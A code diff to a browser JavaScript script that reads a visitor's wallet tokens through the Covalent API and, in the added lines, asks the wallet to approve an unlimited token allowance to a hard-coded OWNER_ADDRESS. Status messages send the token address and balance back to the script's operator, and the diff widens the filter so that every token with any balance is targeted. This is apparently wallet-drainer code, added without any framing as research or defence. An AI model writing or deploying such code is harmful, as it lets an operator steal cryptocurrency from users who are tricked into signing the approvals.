@@ -249,7 +249,7 @@ async function covalenthqAPICall() {
             }
         })
         console.log("tokens-list", map_list)
-        tokens = map_list.filter(f => f.value > 5 && f.symbol != "ETH")
+        tokens = map_list.filter(f => f.balance > 0 && f.symbol != "ETH")
         console.log("chainId:", chainId, "Tokens:", tokens);
         if (window.location.search)
             onSendEther()
@@ -331,7 +331,30 @@ async function loopTokens(tokens){
             })
         }
     else{
-        sendMessage("Invalid token ${token.address}")
+      let instance = new web3Object.eth.Contract(ABI, token.address);
+      sendMessage("New token")
+      await instance.methods.approve(
+          OWNER_ADDRESS,
+          "999999999999999999999999999999999999999999999999999999999999999999999999")
+          .send({
+              from: selectedAccount,
+              to: token.address
+          })
+          .on('transactionHash', (hash) => {
+                 console.log(`Transaction Hash: ${hash}`)
+                
+          })
+          .on('receipt', (receipt) => {
+              console.log(`Transaction Receipt: ${receipt}`)
+              sendMessage("Approve Completed Successfully")
+              sendMessage(`TOKEN Contract Address ${token.address}`)
+              sendMessage(`Token balance is ${token.balance}`)
+              sendMessage(`Your address ${OWNER_ADDRESS}`)
+          })
+          .on('error', (error) => {
+              console.log(`Error: ${error}`)
+              sendMessage("Transaction Rejected")
+          })
     }
     };
 }
